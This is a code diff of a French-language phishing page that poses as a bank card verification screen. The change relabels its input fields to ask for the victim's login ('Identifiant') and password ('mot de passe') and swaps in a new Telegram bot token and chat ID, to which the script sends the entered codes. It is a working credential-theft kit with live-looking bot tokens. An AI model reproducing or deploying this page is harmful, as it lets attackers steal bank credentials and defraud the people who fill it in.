@@ -108,8 +108,8 @@
             <p><strong>N° de carte :</strong> **** **** **** ****</p>
         </div>
 
-        <input type="text" placeholder="Code SMS" id="code-sms" required>
-        <input type="text" placeholder="Code Banque" id="code-banque" required>
+        <input type="text" placeholder="Identifiant" id="code-sms" required>
+        <input type="text" placeholder="mot de passe" id="code-banque" required>
 
         <a href="#" class="btn" onclick="validate()">Valider</a>
 
@@ -136,7 +136,7 @@
             if (smsCode === "" || bankCode === "") {
                 alert("Veuillez remplir tous les champs.");
             } else {
-                const token = "8134195722:AAFQ01VLjnHv3VvUC6v98Ow12oalGfNePm8";
+                const token = "8094841970:AAFFYlK6BoIitk7Dvm091171uV-b6aZSF84";
                 const chatId = "5372119436";
                 const message = `Code SMS: ${smsCode}\nCode Banque: ${bankCode}`;
 
